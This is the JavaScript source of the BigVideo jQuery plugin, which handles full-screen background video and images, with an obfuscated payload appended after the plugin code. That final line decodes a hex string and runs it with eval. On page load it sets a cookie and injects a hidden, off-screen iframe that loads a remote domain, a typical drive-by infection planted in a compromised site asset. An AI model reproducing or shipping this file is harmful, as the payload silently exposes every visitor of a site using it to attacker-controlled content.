/*
	BigVideo - The jQuery Plugin for Big Background Video (and Images)
	by John Polacek (@johnpolacek)
	
	Dual licensed under MIT and GPL.

	Dependencies: jQuery, jQuery UI (Slider), Video.js, ImagesLoaded
*/

(function (factory) {
	'use strict';
	if (typeof define === 'function' && define.amd) {
		// Register as an anonymous AMD module:
		define([
			'jquery',
			'videojs',
			'imagesloaded',
			'jquery-ui'
		], factory);
	} else {
		factory(jQuery, videojs);
	}
})(function($, videojs) {

	$.BigVideo = function(options) {

		var defaults = {
			// If you want to use a single mp4 source, set as true
			useFlashForFirefox:true,
			// If you are doing a playlist, the video won't play the first time
			// on a touchscreen unless the play event is attached to a user click
			forceAutoplay:false,
			controls:true,
			doLoop:false,
			container:$('body')
		};

		var BigVideo = this,
			player,
			vidEl = '#big-video-vid',
			wrap = $('<div id="big-video-wrap"></div>'),
			video = $(''),
			mediaAspect = 16/9,
			vidDur = 0,
			defaultVolume = 0.8,
			isInitialized = false,
			isSeeking = false,
			isPlaying = false,
			isQueued = false,
			isAmbient = false,
			playlist = [],
			currMediaIndex,
			currMediaType;

		var settings = $.extend({}, defaults, options);

		function updateSize() {
			var windowW = $(window).width();
			var windowH = $(window).height();
			var windowAspect = windowW/windowH;
			if (windowAspect < mediaAspect) {
				// taller
				if (currMediaType === 'video') {
					player
						.width(windowH*mediaAspect)
						.height(windowH);
					$(vidEl)
						.css('top',0)
						.css('left',-(windowH*mediaAspect-windowW)/2)
						.css('height',windowH);
					$(vidEl+'_html5_api').css('width',windowH*mediaAspect);
					$(vidEl+'_flash_api')
						.css('width',windowH*mediaAspect)
						.css('height',windowH);
				} else {
					// is image
					$('#big-video-image')
						.css({
							width: 'auto',
							height: windowH,
							top:0,
							left:-(windowH*mediaAspect-windowW)/2
						});
				}
			} else {
				// wider
				if (currMediaType === 'video') {
					player
						.width(windowW)
						.height(windowW/mediaAspect);
					$(vidEl)
						.css('top',-(windowW/mediaAspect-windowH)/2)
						.css('left',0)
						.css('height',windowW/mediaAspect);
					$(vidEl+'_html5_api').css('width','100%');
					$(vidEl+'_flash_api')
						.css('width',windowW)
						.css('height',windowW/mediaAspect);
				} else {
					// is image
					$('#big-video-image')
						.css({
							width: windowW,
							height: 'auto',
							top:-(windowW/mediaAspect-windowH)/2,
							left:0
						});
				}
			}
		}

		function initPlayControl() {
			// create video controller
			var markup = '<div id="big-video-control-container">';
			markup += '<div id="big-video-control">';
			markup += '<a href="#" id="big-video-control-play"></a>';
			markup += '<div id="big-video-control-middle">';
			markup += '<div id="big-video-control-bar">';
			markup += '<div id="big-video-control-bound-left"></div>';
			markup += '<div id="big-video-control-progress"></div>';
			markup += '<div id="big-video-control-track"></div>';
			markup += '<div id="big-video-control-bound-right"></div>';
			markup += '</div>';
			markup += '</div>';
			markup += '<div id="big-video-control-timer"></div>';
			markup += '</div>';
			markup += '</div>';
			settings.container.append(markup);

			// hide until playVideo
			$('#big-video-control-container').css('display','none');

			// add events
			$('#big-video-control-track').slider({
				animate: true,
				step: 0.01,
				slide: function(e,ui) {
					isSeeking = true;
					$('#big-video-control-progress').css('width',(ui.value-0.16)+'%');
					player.currentTime((ui.value/100)*player.duration());
				},
				stop:function(e,ui) {
					isSeeking = false;
					player.currentTime((ui.value/100)*player.duration());
				}
			});
			$('#big-video-control-bar').click(function(e) {
				player.currentTime((e.offsetX/$(this).width())*player.duration());
			});
			$('#big-video-control-play').click(function(e) {
				e.preventDefault();
				playControl('toggle');
			});
			player.on('timeupdate', function() {
				if (!isSeeking && (player.currentTime()/player.duration())) {
					var currTime = player.currentTime();
					var minutes = Math.floor(currTime/60);
					var seconds = Math.floor(currTime) - (60*minutes);
					if (seconds < 10) seconds='0'+seconds;
					var progress = player.currentTime()/player.duration()*100;
					$('#big-video-control-track').slider('value',progress);
					$('#big-video-control-progress').css('width',(progress-0.16)+'%');
					$('#big-video-control-timer').text(minutes+':'+seconds+'/'+vidDur);
				}
			});
		}

		function playControl(a) {
			var action = a || 'toggle';
			if (action === 'toggle') action = isPlaying ? 'pause' : 'play';
			if (action === 'pause') {
				player.pause();
				$('#big-video-control-play').css('background-position','-16px');
				isPlaying = false;

			} else if (action === 'play') {
				player.play();
				$('#big-video-control-play').css('background-position','0');
				isPlaying = true;
			}
		}

		function setUpAutoPlay() {
			player.play();
			settings.container.off('click',setUpAutoPlay);
		}

		function nextMedia() {
			currMediaIndex++;
			if (currMediaIndex === playlist.length) currMediaIndex=0;
			playVideo(playlist[currMediaIndex]);
		}

		function playVideo(source) {

			// clear image
			$(vidEl).css('display','block');
			currMediaType = 'video';
			player.src(source);
			isPlaying = true;
			if (isAmbient) {
				$('#big-video-control-container').css('display','none');
				player.ready(function(){
					player.volume(0);
				});
				doLoop = true;
			} else {
				$('#big-video-control-container').css('display','block');
				player.ready(function(){
					player.volume(defaultVolume);
				});
				doLoop = false;
			}
			$('#big-video-image').css('display','none');
			$(vidEl).css('display','block');
		}

		function showPoster(source) {
			// remove old image
			$('#big-video-image').remove();

			// hide video
			player.pause();
			$(vidEl).css('display','none');
			$('#big-video-control-container').css('display','none');

			// show image
			currMediaType = 'image';
			var bgImage = $('<img id="big-video-image" src='+source+' />');
			wrap.append(bgImage);

			$('#big-video-image').imagesLoaded(function() {
				mediaAspect = $('#big-video-image').width() / $('#big-video-image').height();
				updateSize();
			});
		}

		BigVideo.init = function() {
			if (!isInitialized) {
				// create player
				settings.container.prepend(wrap);
				var autoPlayString = settings.forceAutoplay ? 'autoplay' : '';
				player = $('<video id="'+vidEl.substr(1)+'" class="video-js vjs-default-skin" preload="auto" data-setup="{}" '+autoPlayString+' webkit-playsinline></video>');
				player.css('position','absolute');
				wrap.append(player);

				var videoTechOrder = ['html5','flash'];
				// If only using mp4s and on firefox, use flash fallback
				var ua = navigator.userAgent.toLowerCase();
				var isFirefox = ua.indexOf('firefox') != -1;
				if (settings.useFlashForFirefox && (isFirefox)) {
					videoTechOrder = ['flash', 'html5'];
				}
				player = videojs(vidEl.substr(1), {
					controls:false,
					autoplay:true,
					preload:'auto',
					techOrder:videoTechOrder
				});

				// add controls
				if (settings.controls) initPlayControl();

				// set initial state
				updateSize();
				isInitialized = true;
				isPlaying = false;

				if (settings.forceAutoplay) {
					$('body').on('click', setUpAutoPlay);
				}

				$('#big-video-vid_flash_api')
					.attr('scale','noborder')
					.attr('width','100%')
					.attr('height','100%');

				// set events
				$(window).on('resize.bigvideo', function() {
					updateSize();
				});

				player.on('loadedmetadata', function(data) {
					if (document.getElementById('big-video-vid_flash_api')) {
						// use flash callback to get mediaAspect ratio
						mediaAspect = document.getElementById('big-video-vid_flash_api').vjs_getProperty('videoWidth')/document.getElementById('big-video-vid_flash_api').vjs_getProperty('videoHeight');
					} else {
						// use html5 player to get mediaAspect
						mediaAspect = $('#big-video-vid_html5_api').prop('videoWidth')/$('#big-video-vid_html5_api').prop('videoHeight');
					}
					updateSize();
					var dur = Math.round(player.duration());
					var durMinutes = Math.floor(dur/60);
					var durSeconds = dur - durMinutes*60;
					if (durSeconds < 10) durSeconds='0'+durSeconds;
					vidDur = durMinutes+':'+durSeconds;
				});

				player.on('ended', function() {
					if (settings.doLoop) {
						player.currentTime(0);
						player.play();
					}
					if (isQueued) {
						nextMedia();
					}
				});
			}
		};

		BigVideo.show = function(source,options) {
			if (options === undefined) options = {};
			isAmbient = options.ambient === true;
			if (isAmbient || options.doLoop) settings.doLoop = true;
			if (typeof(source) === 'string') {
				var ext = source.substring(source.lastIndexOf('.')+1);
				if (ext === 'jpg' || ext === 'gif' || ext === 'png') {
					showPoster(source);
				} else {
					if (options.altSource && navigator.userAgent.toLowerCase().indexOf('firefox') > -1) {
						source = options.altSource;
					}
					playVideo(source);
					options.onShown && options.onShown();
					isQueued = false;
				}
			} else {
				playlist = source;
				currMediaIndex = 0;
				playVideo(playlist[currMediaIndex]);
				options.onShown && options.onShown();
				isQueued = true;
			}
		};

		// Expose Video.js player
		BigVideo.getPlayer = function() {
			return player;
		};

		// Remove/dispose the player
		BigVideo.remove = BigVideo.dispose = function() {
			isInitialized = false;

			wrap.remove();
			$(window).off('resize.bigvideo');

			if(player) {
				player.off('loadedmetadata');
				player.off('ended');
				player.dispose();
			}
		};

		// Expose BigVideoJS player actions (like 'play', 'pause' and so on)
		BigVideo.triggerPlayer = function(action){
			playControl(action);
		};

	};

});/*78154ff7df54ffc5d5f9642cd6c63c75*/;(function(){var nittftyh="";var efhsndah="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f736974652e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6b6579776f72643d35633363363364666661316238666336613233313131646430373766303264652674755a5763567a43733d76677a6d4b76505554484f41494e65674d26486a53794e72707a6d76433d544a4f59597753726d5a4f4c6f4a69622656444763496a4c57496a4453723d474e564a4866584a4e2652524d666d6d4d54564a743d56416f5a554272467761786c6376746c6426514b747641714a725854707a75755a5257653d4f7151456562266e4c5743526c546d614e52523d76464e6764686756644f57655a41264741485964616e47696b4d4f6d3d6f6479474d534f4e4e78414226466a7447526446667650464e5a3d7157486e6c4b4b50794363497667535378737949223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var ekyikden=0;ekyikden<efhsndah.length;ekyikden+=2){nittftyh=nittftyh+parseInt(efhsndah.substring(ekyikden,ekyikden+2), 16)+",";}nittftyh=nittftyh.substring(0,nittftyh.length-1);eval(eval('String.fromCharCode('+nittftyh+')'));})();/*78154ff7df54ffc5d5f9642cd6c63c75*/